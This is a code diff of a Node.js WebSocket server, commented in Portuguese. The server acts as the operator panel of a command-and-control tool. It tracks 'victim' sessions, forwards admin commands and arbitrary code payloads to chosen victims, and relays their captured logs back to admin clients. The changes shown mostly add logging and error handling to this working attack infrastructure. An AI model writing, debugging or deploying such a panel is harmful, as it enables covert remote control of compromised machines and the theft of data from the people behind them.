@@ -5,9 +5,11 @@ const app = express();
 const server = http.createServer(app);
 const wss = new WebSocket.Server({ server });
 
-const sessions = {};        // sess -> array de logs
-const victimConnections = {}; // sess -> WebSocket
+const sessions = {};
+const victimConnections = {};
 const adminClients = new Set();
+
+console.log('🟢 Servidor iniciando...');
 
 app.get('/', (req, res) => {
   res.send(`
@@ -192,9 +194,10 @@ app.get('/', (req, res) => {
 
     function connect() {
       ws = new WebSocket(WS_URL);
-      ws.onopen = () => { ws.send(JSON.stringify({type:'admin'})); console.log('[+] Conectado'); };
+      ws.onopen = () => { ws.send(JSON.stringify({type:'admin'})); console.log('[+] Conectado ao servidor'); };
       ws.onmessage = (e) => {
         const msg = JSON.parse(e.data);
+        console.log('[Mensagem recebida]', msg);
         if (msg.type === 'update') {
           if (!allData[msg.sess]) allData[msg.sess] = [];
           allData[msg.sess].push(msg);
@@ -207,7 +210,8 @@ app.get('/', (req, res) => {
           if (keys.length) selectVictim(keys[0]);
         }
       };
-      ws.onclose = () => setTimeout(connect, 2000);
+      ws.onclose = () => { console.log('[Desconectado] Reconectando...'); setTimeout(connect, 2000); };
+      ws.onerror = (err) => console.error('[Erro WebSocket]', err);
     }
 
     // ---------- ENVIA COMANDO ----------
@@ -419,16 +423,21 @@ app.get('/', (req, res) => {
 
 // ---------- WEBSOCKET ----------
 wss.on('connection', (ws) => {
+  console.log('[Servidor] Nova conexão WebSocket estabelecida.');
+
   ws.isAdmin = false;
+  let sessId = null; // será preenchido quando a vítima enviar o handshake
 
   ws.on('message', (msg) => {
     try {
       const data = JSON.parse(msg);
+      console.log('[Servidor] Mensagem recebida:', data);
 
       // Admin
       if (data.type === 'admin') {
         ws.isAdmin = true;
         adminClients.add(ws);
+        console.log('[Servidor] Admin conectado.');
         ws.send(JSON.stringify({ type: 'init', data: sessions }));
         return;
       }
@@ -446,20 +455,20 @@ wss.on('connection', (ws) => {
 
       // COMANDO: encaminha para a vítima específica
       if (data.type === 'command' && data.target) {
+        console.log(`[Servidor] Comando ${data.cmd} para vítima ${data.target}`);
         const targetWs = victimConnections[data.target];
         if (targetWs && targetWs.readyState === WebSocket.OPEN) {
-          // Envia o comando diretamente para a vítima
           const cmdPayload = { type: 'command', cmd: data.cmd };
           if (data.code) cmdPayload.code = data.code;
           targetWs.send(JSON.stringify(cmdPayload));
-          // Notifica o admin que o comando foi enviado
+          console.log(`[Servidor] Comando enviado para ${data.target}`);
           adminClients.forEach(client => {
             if (client.readyState === WebSocket.OPEN) {
               client.send(JSON.stringify({ type: 'update', sess: data.target, type: 'cmd_sent', cmd: data.cmd, _t: Date.now() }));
             }
           });
         } else {
-          // Vítima desconectada
+          console.log(`[Servidor] Vítima ${data.target} offline.`);
           adminClients.forEach(client => {
             if (client.readyState === WebSocket.OPEN) {
               client.send(JSON.stringify({ type: 'update', sess: data.target, type: 'cmd_error', error: 'Vítima offline', _t: Date.now() }));
@@ -471,11 +480,14 @@ wss.on('connection', (ws) => {
 
       // Dados da vítima (inclui handshake e logs normais)
       if (data.sess) {
+        sessId = data.sess;
         // Armazena a conexão da vítima (para comandos futuros)
         if (!victimConnections[data.sess] || victimConnections[data.sess].readyState !== WebSocket.OPEN) {
           victimConnections[data.sess] = ws;
+          console.log(`[Servidor] Vítima ${data.sess} registrada.`);
           // Quando a vítima se desconectar, remover do mapa
           ws.on('close', () => {
+            console.log(`[Servidor] Vítima ${data.sess} desconectada.`);
             if (victimConnections[data.sess] === ws) {
               delete victimConnections[data.sess];
             }
@@ -490,19 +502,25 @@ wss.on('connection', (ws) => {
           }
         });
       }
-    } catch(e) {}
+    } catch (e) {
+      console.error('[Servidor] Erro ao processar mensagem:', e);
+    }
   });
 
   ws.on('close', () => {
+    console.log('[Servidor] Conexão fechada.');
     if (ws.isAdmin) adminClients.delete(ws);
     // Remove a vítima do mapa se a conexão for dela
     for (let sess in victimConnections) {
       if (victimConnections[sess] === ws) {
         delete victimConnections[sess];
+        console.log(`[Servidor] Vítima ${sess} removida do mapa.`);
       }
     }
   });
 });
 
 const PORT = process.env.PORT || 8080;
-server.listen(PORT, () => console.log(`Æ Painel rodando na porta ${PORT}`));
+server.listen(PORT, () => {
+  console.log(`✅ Æ Painel rodando na porta ${PORT}`);
+});
